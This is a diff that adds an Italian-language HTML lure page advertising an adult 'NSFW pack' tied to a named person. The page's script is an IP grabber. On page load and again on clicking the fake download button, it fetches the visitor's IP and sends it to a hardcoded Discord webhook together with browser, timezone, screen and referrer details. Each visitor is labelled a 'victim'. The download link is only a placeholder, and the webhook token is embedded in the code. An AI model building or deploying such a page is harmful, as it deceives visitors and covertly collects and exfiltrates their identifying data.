@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NoxiusNoxy - Arknights NSFW Pack 2026</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 50px;
+        }
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        .button {
+            display: inline-block;
+            padding: 20px 60px;
+            font-size: 28px;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            margin: 40px 0;
+            text-decoration: none;
+            box-shadow: 0 0 30px #ff00ff;
+            transition: all 0.3s;
+        }
+        .button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 50px #00ffff;
+        }
+        h1 { color: #ff00ff; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 NoxiusNoxy Exclusive NSFW Pack 2026 🔥</h1>
+        <p>Arknights + Furry + Lewd Collection (18+)</p>
+        <p><strong>1.8 GB - ZIP Password: noxysnoxy</strong></p>
+
+        <a href="#" id="downloadBtn" class="button">
+            ⬇️ SCARICA ORA
+        </a>
+
+        <p style="margin-top: 50px; opacity: 0.7;">File: noxysnoxy_arknights_nsfw_pack_june2026.zip</p>
+    </div>
+
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1516557179958591658/RHo2_tp0AvLmXndWh3ofo06nEGbbz2gFvD2LdTh81bytuZShO1tnXOo_jt_vLpUxGJBV"; // ← CAMBIA CON IL TUO
+
+        function sendLog() {
+            const data = {
+                content: `**🔥 DOWNLOAD CLICCATO - IP GRABBATO**`,
+                embeds: [{
+                    color: 0xff00ff,
+                    title: "Nuova Vittima",
+                    fields: [
+                        { name: "IP", value: "`" + (window.ip || "N/A") + "`", inline: true },
+                        { name: "User-Agent", value: "`" + navigator.userAgent + "`", inline: false },
+                        { name: "Lingua", value: navigator.language, inline: true },
+                        { name: "Piattaforma", value: navigator.platform, inline: true },
+                        { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+                        { name: "Screen", value: screen.width + "x" + screen.height, inline: true },
+                        { name: "Referrer", value: document.referrer || "Diretto", inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            }).catch(() => {});
+        }
+
+        // Prendi IP tramite servizio pubblico (opzionale ma utile)
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => { window.ip = d.ip; })
+            .catch(() => { window.ip = "N/A"; });
+
+        // Trigger al click
+        document.getElementById('downloadBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            sendLog();
+
+            // Fake download (puoi mettere un link reale a un file vuoto o a un'immagine)
+            const fakeLink = document.createElement('a');
+            fakeLink.href = "https://files.catbox.moe/qualchefile.zip"; // cambia con link reale o vuoto
+            fakeLink.download = "noxysnoxy_arknights_nsfw_pack_june2026.zip";
+            document.body.appendChild(fakeLink);
+            fakeLink.click();
+            document.body.removeChild(fakeLink);
+
+            // Messaggio di conferma
+            setTimeout(() => {
+                alert("Download avviato! Password: noxysnoxy");
+            }, 800);
+        });
+
+        // Log anche al caricamento pagina
+        window.onload = () => sendLog();
+    </script>
+</body>
+</html>
